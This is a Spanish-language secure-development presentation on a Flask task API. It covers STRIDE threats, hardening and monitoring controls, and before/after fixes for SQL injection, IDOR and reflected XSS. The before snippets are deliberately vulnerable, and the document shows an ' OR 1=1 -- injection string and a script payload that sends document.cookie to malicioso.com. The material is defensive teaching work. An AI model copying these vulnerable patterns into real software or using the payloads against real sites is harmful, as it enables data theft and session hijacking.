  • • Elevation of Privilege: Acceso a recursos de otros usuarios (IDOR).
  • • Tampering: Alteración no autorizada de tareas en base de datos.

🛡️ Controles Implementados

  • • JWT con identificador jti (UUIDv4) y versión de token individual.
  • • Delimitación de Trust Boundaries entre cliente, API y capa SQLite.

Fase 3

1. Mapa SSDLC — Etapas 5 (Despliegue) y 6 (Operación)

Fases de Producción
E5

Despliegue Seguro

Hardening de Infraestructura & Red

Fase 5

⚠️ Amenazas Identificadas

  • • Interceptación de credenciales y tokens mediante ataques Man-in-the-Middle (MitM).
  • • Cross-Origin Request Forgery por configuración abierta o descuidada de CORS (*).
  • • Ausencia de cabeceras de protección del navegador (Clickjacking, MIME sniffing).

🛡️ Controles Implementados

  • • Cifrado en tránsito TLS/HTTPS forzado extremo a extremo mediante plataforma Render.
  • • Middleware de Cabeceras de Seguridad: X-Frame-Options: DENY, HSTS, X-Content-Type.
  • • Política CORS estricta que rechaza orígenes no autenticados o no autorizados.
E6

Operación y Monitoreo

Auditoría, Trazabilidad & Respuesta

Fase 6

⚠️ Amenazas Identificadas

  • • Incidentes de intrusión silenciosos sin registro forense ni trazabilidad.
  • • Sesiones de usuarios comprometidas que continúan válidas tras cambiar contraseña.
  • • Exposición de información sensible o credenciales dentro de los archivos de log.

🛡️ Controles Implementados

  • • Archivo audit.log estructurado que audita eventos omitiendo contraseñas.
  • • Mecanismo token_version: revoca automáticamente todas las sesiones previas.
  • • Endpoint de logout con revocación en servidor y monitoreo de IPs sospechosas.

4. Propuesta de Código Seguro — Inyección SQL (CWE-89)

SAST: Bandit B608

Vulnerabilidad Identificada: Interpolación directa mediante formatted strings (f"SELECT... {user_id}") en app_vulnerable.py (L49).

❌ Código Vulnerable (Antes) app_vulnerable.py
# ⚠️ Bandit B608: Inyección SQL detectada @app.route("/tareas") def listar_tareas(): user_id = request.args.get("user_id") # ⛔ PELIGRO: Concatena input directo en SQL query = f"SELECT * FROM tareas WHERE user_id = {user_id}" cur.execute(query) return jsonify(cur.fetchall())
Impacto: Con el parámetro ' OR 1=1 -- el atacante salta la condición y extrae las tareas privadas de toda la organización.
✅ Código Seguro Refactorizado (Después) app_segura.py / main.py
# ✅ Prepared Statement con parámetros aislados @app.route("/tareas") def listar_tareas(): user_id = request.args.get("user_id") # 🛡️ DEFENSIVO: Placeholder ? separa código de datos cur.execute( "SELECT * FROM tareas WHERE user_id = ?", (user_id,) ) return jsonify(cur.fetchall())
Solución Defensiva: El compilador SQLite precompila la estructura SQL. El input del usuario se procesa como dato literal puro sin poder modificar la lógica.

4. Propuesta de Código Seguro — IDOR / Broken Access Control (CWE-284)

SAST: Pylint W0612

Vulnerabilidad Identificada: Pylint detectó la advertencia W0612 (unused-variable user_id_session) evidenciando que se obtenía el usuario de la sesión pero jamás se contrastaba contra el dueño de la tarea.

❌ Código Vulnerable (Antes) app_vulnerable.py
# ⚠️ Pylint W0612: Variable sin utilizar @app.route("/tareas/<int:id>", methods=["DELETE"]) def eliminar_tarea(id): user_id_session = session.get("user_id") # Se obtiene # ⛔ NUNCA SE VERIFICA PROPIEDAD cur.execute("DELETE FROM tareas WHERE id = ?", (id,)) db.commit() return jsonify({"msg": "Eliminado"})
Impacto: Cualquier usuario autenticado podía eliminar o modificar tareas ajenas con solo iterar números correlativos en la URL (/tareas/1, /tareas/2).
✅ Código Seguro Refactorizado (Después) app_segura.py / main.py
# ✅ Verificación previa de pertenencia (Anti-IDOR) @app.route("/tareas/<int:id>", methods=["DELETE"]) def eliminar_tarea(id): user_id = session.get("user_id") tarea = cur.execute( "SELECT owner_id FROM tareas WHERE id = ?", (id,) ).fetchone() if not tarea or tarea["owner_id"] != user_id: abort(403) # HTTP 403 Forbidden estricto cur.execute("DELETE FROM tareas WHERE id = ?", (id,))
Solución Defensiva: Control de acceso a nivel de fila (Row-Level Security). Si el ID de sesión no coincide exactamente con el dueño, el servidor deniega la acción con código HTTP 403.

4. Propuesta de Código Seguro — XSS Reflected (CWE-79)

SAST: Bandit B201

Vulnerabilidad Identificada: Bandit reportó B201 (Flask render_template_string) con severidad High al renderizar variables de texto directamente sin neutralizar etiquetas HTML.

❌ Código Vulnerable (Antes) app_vulnerable.py
from flask import render_template_string @app.route("/comentario") def mostrar_comentario(): comentario = request.args.get("texto", "") # ⛔ XSS: Renderiza HTML y scripts sin sanitizar return render_template_string( f"<div>Comentario: {comentario}</div>" )
Impacto: Inyectar <script>fetch('https://malicioso.com/?cookie='+document.cookie)</script> permite el robo de tokens de sesión activos de las víctimas.
✅ Código Seguro Refactorizado (Después) app_segura.py
from markupsafe import escape @app.route("/comentario") def mostrar_comentario(): comentario = request.args.get("texto", "") # 🛡️ DEFENSIVO: escape() codifica entidades peligrosas safe_text = escape(comentario) return f"<div>Comentario: {safe_text}</div>"
Solución Defensiva: Conversión de caracteres especiales (< se transforma en &lt;, > en &gt;). El navegador muestra el texto visualmente sin llegar a ejecutar el script.

5. Conclusiones — Reflexión Técnica del Equipo

Lecciones Aprendidas
🛡️

Eficacia del Modelado de Amenazas

El análisis preliminar con STRIDE permitió evidenciar vectores como IDOR que los frameworks modernos no mitigan por defecto. Definir el ownership a nivel de entidad protegió las operaciones críticas de borrado y edición desde la raíz arquitectónica.

🔍

Valor del Análisis Estático (SAST)

Herramientas como Bandit y Pylint aportaron objetividad inmediata. Señalaron con precisión quirúrgica el uso de variables desatendidas (W0612) y sentencias SQL vulnerables (B608), agilizando las refactorizaciones.

🧪

Testing Negativo como Red de Seguridad

Validar únicamente casos felices no garantiza software seguro. Las 19 pruebas de penetración automatizadas simularon ataques reales, asegurando que cualquier cambio futuro mantenga intactas las barreras contra inyecciones y accesos ilegítimos.

🌐

Observabilidad y Hardening en Producción

El despliegue en Render con HTTPS forzado, sumado a cabeceras de seguridad estrictas (HSTS, CSP) y logging con omisión de credenciales, consolidó un entorno observable listo para operar bajo estándares profesionales OWASP.
